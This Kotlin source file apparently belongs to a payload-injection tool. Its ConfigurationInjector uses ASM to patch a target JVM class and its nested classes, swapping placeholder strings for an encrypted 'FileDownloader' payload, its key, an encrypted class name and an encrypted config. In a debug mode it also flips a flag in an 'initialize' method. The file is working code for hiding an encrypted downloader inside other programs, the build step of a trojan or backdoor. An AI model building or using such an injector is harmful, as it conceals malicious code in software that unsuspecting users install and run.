package com.tmquan2508.inject.core.payload.transformation

import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.tmquan2508.inject.cli.Logs
import com.tmquan2508.inject.config.Config
import com.tmquan2508.inject.util.*
import org.objectweb.asm.ClassReader
import org.objectweb.asm.ClassWriter
import org.objectweb.asm.Opcodes
import org.objectweb.asm.tree.ClassNode
import org.objectweb.asm.tree.InsnNode
import org.objectweb.asm.tree.LdcInsnNode

object ConfigurationInjector {
    private const val DOWNLOADER_CLASS_NAME_CONST = "com/tmquan2508/payload/FileDownloader.class"
    private val gson = Gson()

    fun apply(
        originalBytecodeMap: Map<String, ByteArray>,
        targetClassName: String,
        downloaderBytes: ByteArray,
        config: Config,
        configJson: String
    ): Map<String, ByteArray> {
        val replacementMap = buildFinalPlaceholderMap(downloaderBytes, configJson)

        val mainClassBytes = originalBytecodeMap[targetClassName]
            ?: throw IllegalStateException("Configuration target class '$targetClassName' not found in transformed bytecode map.")

        val mainClassNode = ClassNode().also { ClassReader(mainClassBytes).accept(it, 0) }

        val classesToPatch = mutableSetOf(targetClassName)
        mainClassNode.innerClasses?.forEach { innerClassNode ->
            if (innerClassNode.outerName == mainClassNode.name) {
                Logs.debug("  [DISCOVERY] Found nested class: ${innerClassNode.name}")
                classesToPatch.add(innerClassNode.name)
            }
        }

        val finalBytecodeMap = mutableMapOf<String, ByteArray>()
        originalBytecodeMap.forEach { (className, originalBytes) ->
            if (className in classesToPatch) {
                Logs.debug("  [PATCH] Applying configuration to $className")
                finalBytecodeMap[className] = injectPlaceholders(originalBytes, replacementMap, config.displayDebugMessages)
            } else {
                finalBytecodeMap[className] = originalBytes
            }
        }

        Logs.info(" -> Successfully applied combined encrypted configuration using ASM.")
        return finalBytecodeMap
    }

    private fun injectPlaceholders(originalBytecode: ByteArray, placeholders: Map<String, String>, debugFlag: Boolean): ByteArray {
        val classReader = ClassReader(originalBytecode)
        val classNode = ClassNode()
        classReader.accept(classNode, 0)
        classNode.methods.forEach { method ->
            method.instructions.forEach { insn ->
                if (insn is LdcInsnNode && insn.cst is String && placeholders.containsKey(insn.cst as String)) {
                    val placeholder = insn.cst as String
                    insn.cst = placeholders[placeholder]
                    Logs.debug("  [ASM-LDC] Replaced '$placeholder' in ${classNode.name}.${method.name}")
                }
            }

            if (debugFlag && method.name == "initialize") {
                val instructions = method.instructions
                for (i in 0 until instructions.size()) {
                    val insn = instructions.get(i)
                    if (insn.opcode == Opcodes.ICONST_0) {
                        Logs.debug("  [ASM-OPCODE] Replaced ICONST_0 with ICONST_1 in ${classNode.name}.${method.name}")
                        instructions.set(insn, InsnNode(Opcodes.ICONST_1))
                        break
                    }
                }
            }
        }
        val classWriter = ClassWriter(ClassWriter.COMPUTE_FRAMES)
        classNode.accept(classWriter)
        return classWriter.toByteArray()
    }

    private fun buildFinalPlaceholderMap(downloaderBytes: ByteArray, configJson: String): Map<String, String> {
        val finalMap = mutableMapOf<String, String>()
        val key = generateRandomKey(32)

        val downloaderClassName = DOWNLOADER_CLASS_NAME_CONST.replace(".class", "").replace('/', '.')
        finalMap["::KEY::"] = key
        finalMap["::ENCRYPTED_PAYLOAD::"] = encryptWithRandomKey(downloaderBytes, key)
        finalMap["::ENCRYPTED_DOWNLOADER_CLASS_NAME::"] = encryptWithRandomKey(downloaderClassName.toByteArray(Charsets.UTF_8), key)

        val type = object : TypeToken<MutableMap<String, Any>>() {}.type
        val configMap: MutableMap<String, Any> = gson.fromJson(configJson, type)

        (configMap["password"] as? String)?.takeIf { it.isNotEmpty() }?.let { plainPassword ->
            configMap["password"] = plainPassword.toSha256()
        }

        val processedConfigJson = gson.toJson(configMap)
        finalMap["::CONFIG::"] = StaticKeyEncoder.encrypt(processedConfigJson)

        return finalMap
    }
}